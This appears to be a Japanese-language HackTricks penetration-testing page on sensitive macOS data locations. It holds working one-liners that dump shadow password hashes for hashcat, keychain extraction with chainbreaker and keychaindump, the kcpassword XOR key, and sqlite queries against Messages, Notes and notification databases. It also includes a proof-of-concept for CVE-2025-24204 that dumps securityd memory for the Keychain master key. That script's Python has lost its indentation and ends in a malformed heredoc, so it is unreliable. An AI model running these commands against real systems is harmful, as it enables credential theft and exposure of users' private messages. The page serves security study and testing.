# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## パスワード

### シャドウパスワード

シャドウパスワードは、**`/var/db/dslocal/nodes/Default/users/`** にある plist にユーザーの設定とともに保存されています。\
以下の one-liner を使用すると、**ユーザーに関するすべての情報**（hash 情報を含む）を dump できます：
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**このようなScripts**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) または [**こちらのScripts**](https://github.com/octomagon/davegrohl.git) を使用して、hash を **hashcat** **format** に変換できます。

macOS PBKDF2-SHA512 の hashcat format `-m 7100` で、すべての non-service account の creds を dump する別の one-liner:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
ユーザーの `ShadowHashData` を取得する別の方法として、`dscl` を使用できます: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

このファイルは、システムが **single-user mode** で実行されている場合に**のみ使用されます**（そのため、あまり頻繁には使用されません）。

### Keychain Dump

security binary を使用して**復号されたパスワードをdump**する場合、この操作をユーザーに許可するよう求めるプロンプトが複数回表示されます。
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
現代の macOS では、最も興味深い backing store は通常 **`~/Library/Keychains/login.keychain-db`** と **`/Library/Keychains/System.keychain`** です。これらは SQLite-backed ファイルですが、平文へのアクセスは依然として **`securityd`** によって仲介されます。raw DB を盗んでも、ユーザーのパスワード、`SystemKey`、またはメモリ上の master key を別途復元しない限り、主にメタデータと暗号化された blob しか得られません。<sup>[2]</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> このコメント [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) に基づくと、これらのツールは Big Sur ではもう動作しないようです。

### Keychaindump の概要

macOS の keychain からパスワードを抽出する **keychaindump** というツールが開発されていますが、[discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) で示されているように、Big Sur などの新しい macOS では制限があります。**keychaindump** を使用するには、攻撃者がアクセス権を取得し、**root** へ privilege escalation する必要があります。このツールは、利便性のためユーザーの login 時に keychain がデフォルトで unlock され、アプリケーションがユーザーのパスワードを何度も要求せずにアクセスできるという事実を悪用します。ただし、ユーザーが使用するたびに keychain を lock する設定を選択している場合、**keychaindump** は効果を発揮しません。

**Keychaindump** は、keychain へのアクセスに不可欠な authorization および cryptographic operations 用の daemon と Apple が説明している、**securityd** という特定のプロセスを target にします。extraction process では、ユーザーの login password から派生した **Master Key** を特定します。この key は keychain file を読み取るために不可欠です。**Master Key** を見つけるため、**keychaindump** は `vmmap` command を使用して **securityd** の memory heap を scan し、`MALLOC_TINY` として flag された領域内から候補となる key を探します。これらの memory location を調査するには、次の command を使用します。
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
潜在的な master key を特定した後、**keychaindump** はヒープ内から、master key の候補を示す特定のパターン（`0x0000000000000018`）を検索します。この key を利用するには、**keychaindump** のソースコードに記載されているとおり、deobfuscation などの追加手順が必要です。この分野を分析する担当者は、keychain の復号に必要な重要データが **securityd** プロセスのメモリ内に保存されていることに注意してください。**keychaindump** を実行するコマンドの例は次のとおりです：
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) は、法科学的に妥当な方法で OSX keychain から以下の種類の情報を抽出できます。

- [hashcat](https://hashcat.net/hashcat/) または [John the Ripper](https://www.openwall.com/john/) で cracking に使用できる、hashed keychain password
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

keychain unlock password、[volafox](https://github.com/n0fate/volafox) または [volatility](https://github.com/volatilityfoundation/volatility) で取得した master key、あるいは SystemKey などの unlock file がある場合、Chainbreaker は plaintext passwords も提供します。

これらの方法のいずれかを使用して Keychain を unlock しない場合、Chainbreaker はその他の利用可能な情報をすべて表示します。

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKeyを使用してキーチェーンキー（パスワード付き）をダンプする**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **keychainキーをダンプする（パスワード付き）、hashをcrackする**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) with memory dump**

**memory dump**を実行するには、[Follow these steps](../index.html#dumping-memory-with-osxpmem)。
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **ユーザーのパスワードを使用してキーチェーンキー（パスワード付き）をDumpする**

ユーザーのパスワードを知っている場合、それを使用して**ユーザーに属するキーチェーンをDumpして復号**できます。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### `gcore` entitlement による Keychain master key の取得（CVE-2025-24204）

macOS 15.0（Sequoia）には **`com.apple.system-task-ports.read`** entitlement が付与された `/usr/bin/gcore` が同梱されていたため、ローカル管理者（または悪意のある署名済みアプリ）は、SIP/TCC が適用されていても **あらゆるプロセスのメモリをダンプ**できました。`securityd` をダンプすると **Keychain master key** が平文で漏えいし、ユーザーのパスワードなしで `login.keychain-db` を復号できます。<sup>[1]</sup>

**脆弱なビルド（15.0～15.2）での簡単な再現：**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
抽出した hex key を Chainbreaker（`--key <hex>`）に渡して、login keychain を復号します。Apple は **macOS 15.3+** で entitlement を削除したため、これはパッチが適用されていない Sequoia ビルド、または脆弱なバイナリを保持しているシステムでのみ機能します。

### kcpassword

**kcpassword** ファイルには、システム所有者が **automatic login を有効にしている** 場合に限り、**ユーザーの login password** が保存されています。そのため、ユーザーはパスワードを求められることなく自動的にログインされます（あまり安全ではありません）。

パスワードは、キー **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** で XOR された状態で **`/etc/kcpassword`** ファイルに保存されています。ユーザーのパスワードがキーより長い場合、キーは再利用されます。\
そのため、例えば[**このスクリプト**](https://gist.github.com/opshope/32f65875d45215c3677d)のようなスクリプトを使用すれば、パスワードを簡単に復元できます。

## Databases 内の興味深い情報

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

**Sequoia** より前では、通常、Notification Center のストアは **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** にあります。**Sequoia+** では、Apple はこれを TCC で保護されたグループコンテナ **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** に移動しました。

興味深い情報の大部分は **blob** カラム内に保存されているため、その内容を抽出し、人間が読める形式（`plutil -p -`、`strings`、または小規模なパーサー）に変換する必要があります。簡単なトリアージの例:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### 最近のプライバシー問題（NotificationCenter DB）

- macOS **14.7–15.1** では、Apple はバナーの内容を適切に redact せず `db2/db` SQLite に保存していました。CVE **CVE-2024-44292/44293/40838/54504** により、任意の local user が DB を開くだけで、他のユーザーの notification text を読み取ることができました（TCC prompt は不要）。
- Apple は、新しい Sequoia build で DB を `group.com.apple.usernoted` に移動し、TCC で保護することでこの問題を緩和しました。そのため、current system では通常、読み取るには適切な user context または TCC bypass が必要です。<sup>[3]</sup>
- legacy endpoint では、artefact を保持したい場合、update または reboot の前に `db`、`db-wal`、`db-shm` ファイルをまとめて copy してください。

### Notes

ユーザーの **notes** は `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` にあります。
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
上記のワンライナーの出力が多すぎる場合は、`ZICNOTEDATA.ZDATA` を export して gunzip し、protobuf を parse してください。これは SQLite に対して直接 `strings` を実行するよりも、通常は信頼性が高くなります。

### Background Tasks / Login Items

**Ventura** 以降、ユーザーが承認した Login Items と複数のバックグラウンドタスクは、**`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** などの **BTM** stores、および versioned system cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`** で追跡されます。

これらのファイルは、persistence、helper tools、および一部の MDM-managed background items をすばやく特定するのに役立ちます：
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
永続化の観点と BTM internals については、[auto-start locations ページ](../../macos-auto-start-locations.md#login-items) と [Background Tasks Management の notes](../macos-security-protections/README.md#background-tasks-management) を確認してください。

## Preferences

macOS アプリでは Preferences は **`$HOME/Library/Preferences`** にあり、iOS では `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` にあります。

macOS では、CLI ツール **`defaults`** を使用して **Preferences file を変更**できます。

**`/usr/sbin/cfprefsd`** は XPC services `com.apple.cfprefsd.daemon` と `com.apple.cfprefsd.agent` を claim し、Preferences の変更などのアクションを実行するために呼び出すことができます。

## OpenDirectory permissions.plist

`/System/Library/OpenDirectory/permissions.plist` ファイルには、node attributes に適用される permissions が含まれており、SIP によって保護されています。\
このファイルは、特定の sensitive information（`ShadowHashData`、`HeimdalSRPKey`、`KerberosKeys` など）にアクセスできるよう、UUID（uid ではない）によって特定の users に permissions を付与します：
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

通知用のメインデーモンは **`/usr/sbin/notifyd`** です。通知を受信するには、クライアントは `com.apple.system.notification_center` Mach port を通じて登録する必要があります（`sudo lsmp -p <pid notifyd>` で確認できます）。デーモンは `/etc/notify.conf` ファイルで設定できます。

通知に使用される名前は一意な reverse DNS 表記であり、そのいずれかに通知が送信されると、それを処理できると示したクライアントが受信します。

notifyd プロセスに SIGUSR2 シグナルを送信し、生成されたファイル `/var/run/notifyd_<pid>.status` を読み取ることで、現在のステータス（およびすべての名前）をダンプできます。
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**`/usr/sbin/distnoted`** をメインバイナリとする **Distributed Notification Center** は、通知を送信するもう1つの方法です。いくつかの XPC services を公開しており、client の検証を試みるためにいくつかのチェックを実行します。

### Apple Push Notifications (APN)

この場合、applications は **topics** に登録できます。client は **`apsd`** を介して Apple の servers に接続し、token を生成します。\
その後、providers も token を生成し、Apple の servers に接続して client に messages を送信できるようになります。これらの messages は **`apsd`** によってローカルで受信され、通知を待機している application に中継されます。

preferences は `/Library/Preferences/com.apple.apsd.plist` にあります。

macOS では `/Library/Application\ Support/ApplePushService/aps.db` に、iOS では `/var/mobile/Library/ApplePushService` に messages の local database があります。これには `incoming_messages`、`outgoing_messages`、`channel` の3つの tables があります。
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
daemon と接続に関する情報を取得することも可能です。
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## ユーザー通知

これらはユーザーが画面上で確認する通知です。

- **`CFUserNotification`**: 画面上にメッセージ付きのポップアップを表示する方法を提供する API です。
- **The Bulletin Board**: iOS で、表示後に消え、Notification Center に保存されるバナーを表示します。
- **`NSUserNotificationCenter`**: MacOS における iOS の bulletin board です。古い macOS リリースでは、データベースは通常 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` にあります。Sequoia+ では `~/Library/Group Containers/group.com.apple.usernoted/db2/db` に移動されました。

## 参考資料

- [1] [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
